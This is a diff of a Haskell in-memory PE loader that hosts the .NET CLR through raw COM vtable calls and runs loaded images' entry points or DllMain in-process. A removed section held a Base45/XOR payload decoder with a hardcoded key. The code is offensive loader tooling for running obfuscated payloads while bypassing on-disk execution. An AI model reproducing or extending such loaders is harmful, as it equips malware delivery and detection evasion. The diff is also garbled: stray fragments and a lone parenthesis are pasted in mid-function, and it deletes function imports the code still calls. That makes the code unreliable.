@@ -387,29 +387,31 @@ guid_ICLRRuntimeHost :: GUID
 guid_ICLRRuntimeHost = GUID 0x90F1A06C 0x7712 0x4762 [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02]
 
 -- Dynamic Wrappers for VTable Methods
-foreign import ccall "dynamic"
-  mkCLRQueryInterface :: FunPtr (Ptr ICLRRuntimeHost -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT)
-                      -> (Ptr ICLRRuntimeHost -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT)
+-- Using Ptr () ensures correct register alignment on x64 and avoids type conflicts.
 
 foreign import ccall "dynamic"
-  mkCLRAddRef :: FunPtr (Ptr ICLRRuntimeHost -> IO ULONG)
-              -> (Ptr ICLRRuntimeHost -> IO ULONG)
+  mkCLRQueryInterface :: FunPtr (Ptr () -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT)
+                      -> (Ptr () -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT)
 
 foreign import ccall "dynamic"
-  mkCLRRelease :: FunPtr (Ptr ICLRRuntimeHost -> IO ULONG)
-               -> (Ptr ICLRRuntimeHost -> IO ULONG)
+  mkCLRAddRef :: FunPtr (Ptr () -> IO ULONG)
+              -> (Ptr () -> IO ULONG)
 
 foreign import ccall "dynamic"
-  mkCLRStart :: FunPtr (Ptr ICLRRuntimeHost -> IO HRESULT)
-             -> (Ptr ICLRRuntimeHost -> IO HRESULT)
+  mkCLRRelease :: FunPtr (Ptr () -> IO ULONG)
+               -> (Ptr () -> IO ULONG)
 
 foreign import ccall "dynamic"
-  mkCLRStop :: FunPtr (Ptr ICLRRuntimeHost -> IO HRESULT)
-            -> (Ptr ICLRRuntimeHost -> IO HRESULT)
+  mkCLRStart :: FunPtr (Ptr () -> IO HRESULT)
+             -> (Ptr () -> IO HRESULT)
 
 foreign import ccall "dynamic"
-  mkCLRGetDefaultDomain :: FunPtr (Ptr ICLRRuntimeHost -> Ptr (Ptr IUnknown) -> IO HRESULT)
-                        -> (Ptr ICLRRuntimeHost -> Ptr (Ptr IUnknown) -> IO HRESULT)
+  mkCLRStop :: FunPtr (Ptr () -> IO HRESULT)
+            -> (Ptr () -> IO HRESULT)
+
+foreign import ccall "dynamic"
+  mkCLRGetDefaultDomain :: FunPtr (Ptr () -> Ptr (Ptr IUnknown) -> IO HRESULT)
+                        -> (Ptr () -> Ptr (Ptr IUnknown) -> IO HRESULT)
 
 -- Accessors for ICLRRuntimeHostVTable methods
 pQueryInterface :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr ICLRRuntimeHost -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT))
@@ -860,7 +862,7 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
   comDir <- getDataDirectory ntHeadersInMem iMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR
   comDirData <- peek comDir
 
-  if dd_virtualAddress comDirData /= 0 && dd_size comDirData /= 0
+   if dd_virtualAddress comDirData /= 0 && dd_size comDirData /= 0
     then do
       putStrLn "[*] Detected .NET assembly. Attempting to load CLR via hosting APIs."
       hFlush stdout
@@ -868,8 +870,6 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
       -- Initialize COM
       hr <- c_CoInitializeEx nullPtr 0 -- COINIT_APARTMENTTHREADED
       
-      -- RPC_E_CHANGED_MODE (0x80010106) means COM is already init in a different mode.
-      -- This is generally harmless for our purposes.
       when (hr < 0 && hr /= -2147417850) $ do
         err <- c_GetLastError
         putStrLn $ "[!] CoInitializeEx warning: " ++ show hr ++ " (last error: " ++ show err ++ ")"
@@ -877,31 +877,26 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
       putStrLn "[*] COM initialized."
       hFlush stdout
 
-      -- ACQUIRE RUNTIME HOST (UPDATED: Dual Support v4/v2)
+      -- ACQUIRE RUNTIME HOST
       pRuntimeHostRaw <- getCLRRuntimeHost
-      let runtimeHost = ICLRRuntimeHost (castPtr pRuntimeHostRaw)
+      let (ICLRRuntimeHost runtimeHostRaw) = ICLRRuntimeHost (castPtr pRuntimeHostRaw)
       
       putStrLn "[*] ICLRRuntimeHost instance created."
       hFlush stdout
 
-      vtablePtr <- peek (castPtr pRuntimeHostRaw)
-      let vtablePtr' = castPtr vtablePtr :: Ptr ICLRRuntimeHostVTable
-
-      -- [FIXED]: Ensure vtablePtrRaw is treated as a pointer to the VTable
-      let vtablePtrRaw = vtablePtr' 
-      let (ICLRRuntimeHost runtimeHostRaw) = runtimeHost
+      -- [FIXED]: We MUST peek the object pointer to get the actual VTable address.
+      -- Without this, we are jumping to a null or junk address.
+      vtablePtr <- peek (castPtr runtimeHostRaw) :: IO (Ptr (Ptr ()))
+      let vtablePtrRaw = vtablePtr
 
       -- 1. Get the Start function pointer from the VTable
-      -- We MUST ensure pStart is looking at the correct 64-bit offset
       pStartFuncPtr <- pStart (castPtr vtablePtrRaw)
       
-      -- CRITICAL: Check if the pointer is null before calling it
       if pStartFuncPtr == nullFunPtr
-        then error "[-] Critical Error: pStartFuncPtr is NULL. Your VTable offset is likely wrong for x64."
+        then error "[-] Critical Error: pStartFuncPtr is NULL. VTable offset is wrong for x64."
         else putStrLn $ "[*] Start function pointer located at: " ++ show pStartFuncPtr
 
       -- 2. Call the Start method
-      -- The first argument (the 'this' pointer) is mandatory in COM
       hrStart <- mkCLRStart pStartFuncPtr (castPtr runtimeHostRaw)
       
       if hrStart < 0 
@@ -911,6 +906,7 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
         else do
           putStrLn "[*] CLR started successfully."
           hFlush stdout
+
       alloca $ \ppvDomain -> do
         pGetDefaultDomainFuncPtr <- pGetDefaultDomain (castPtr vtablePtrRaw)
         hrGetDomain <- mkCLRGetDefaultDomain pGetDefaultDomainFuncPtr (castPtr runtimeHostRaw) ppvDomain
@@ -918,20 +914,16 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
         when (hrGetDomain < 0) $ do
           err <- c_GetLastError
           error $ "ICLRRuntimeHost::GetDefaultDomain failed: " ++ show hrGetDomain ++ " (last error: " ++ show err ++ ")"
+        
         putStrLn "[*] Default AppDomain obtained."
         hFlush stdout
   
         pAppDomainIUnknown <- peek ppvDomain
-        let pAppDomain = castPtr pAppDomainIUnknown :: Ptr AppDomain
-        let appDomain = AppDomain (castPtr pAppDomain)
+        let (AppDomain appDomainRaw) = AppDomain (castPtr pAppDomainIUnknown)
         
-        domainVtablePtr <- peek (castPtr pAppDomain)
-        let domainVtablePtr' = castPtr domainVtablePtr :: Ptr AppDomainVTable
-
-        -- [FIXED]: Do not unwrap domainVtablePtr'. It is already the pointer we need.
-        let domainVtablePtrRaw = domainVtablePtr'
-        -- The appDomain variable DOES need unwrapping.
-        let (AppDomain appDomainRaw) = appDomain
+        -- [FIXED]: Peek the AppDomain pointer to get its VTable
+        domainVtablePtr <- peek (castPtr appDomainRaw) :: IO (Ptr (Ptr ()))
+        let domainVtablePtrRaw = domainVtablePtr
 
         appBasePath <- newCWString "C:\\"
         bstrAppBase <- c_SysAllocString (castPtr appBasePath)
@@ -943,14 +935,17 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
         pPutApplicationBaseFuncPtr <- pPutApplicationBase (castPtr domainVtablePtrRaw)
         hrPutAppBase <- mkADPutApplicationBase pPutApplicationBaseFuncPtr (castPtr appDomainRaw) bstrAppBase
         c_SysFreeString bstrAppBase
+        
         when (hrPutAppBase < 0) $ do
           err <- c_GetLastError
           error $ "_AppDomain::put_ApplicationBase failed: " ++ show hrPutAppBase ++ " (last error: " ++ show err ++ ")"
+        
         putStrLn "[*] AppDomain ApplicationBase set to C:\\."
         hFlush stdout
 
         putStrLn "[*] Calling _CorExeMain..."
         hFlush stdout
+        -- Note: Ensure _CorExeMain is imported correctly for x64
         rc <- c_CorExeMain imageBase
         putStrLn $ "[*] _CorExeMain returned: " ++ show rc
         hFlush stdout
@@ -977,6 +972,32 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
       putStrLn "[*] COM uninitialized."
       hFlush stdout
       return ()
+      Entry point virtual address: 0x" ++ showHex entryAddrInteger ""
+      putStrLn $ "[*] Subsystem: " ++ show subsystem
+      hFlush stdout
+
+      putStrLn "[*] Execution gate passed. Executing entry point (in-memory)."
+      hFlush stdout
+
+      if subsystem == 2 || subsystem == 3
+        then do
+          let entryFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (IO Int32)
+          putStrLn "[*] Calling mkEntryPoint..."
+          hFlush stdout
+          rc <- mkEntryPoint entryFunPtr
+          putStrLn $ "[*] Entry point returned: " ++ show rc
+          hFlush stdout
+          return ()
+        else do
+          let dllMainFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (Ptr () -> Word32 -> Ptr () -> IO Int32)
+          putStrLn "[*] Calling mkDllMain..."
+          hFlush stdout
+          rc <- mkDllMain dllMainFunPtr imageBase dLL_PROCESS_ATTACH nullPtr
+          putStrLn $ "[*] DllMain returned: " ++ show rc
+          hFlush stdout
+          return ()
+
+)
     else do
       optHeaderInMem <- nt_optionalHeader <$> peek ntHeadersInMem
       let entryPointRVA = oh_addressOfEntryPoint optHeaderInMem
@@ -1015,35 +1036,8 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
           hFlush stdout
           return ()
 
--- ============================================
--- DUAL DECODING: Base45 -> XOR
--- ============================================
 
-secretKey :: BS.ByteString
-secretKey = BS.pack $ map (fromIntegral . fromEnum) "comp340659"
-
-xorDecode :: BS.ByteString -> BS.ByteString -> BS.ByteString
-xorDecode key payload
-  | BS.null key = error "xorDecode: key must not be empty"
-  | otherwise =
-      let klist = BS.unpack key
-          plen  = BS.length payload
-          plist = BS.unpack payload
-          decoded = zipWith xor plist (take (fromIntegral plen) (cycle klist))
-      in BS.pack decoded
-
--- ============================================
--- FUNCTION POINTER WRAPPERS
--- ============================================
-
-foreign import ccall "dynamic"
-  mkEntryPoint :: FunPtr (IO Int32) -> IO Int32
-
-foreign import ccall "dynamic"
-  mkDllMain :: FunPtr (Ptr () -> Word32 -> Ptr () -> IO Int32)
-            -> (Ptr () -> Word32 -> Ptr () -> IO Int32)
-
--- ============================================
+=====================
 -- MAIN
 -- ============================================
 
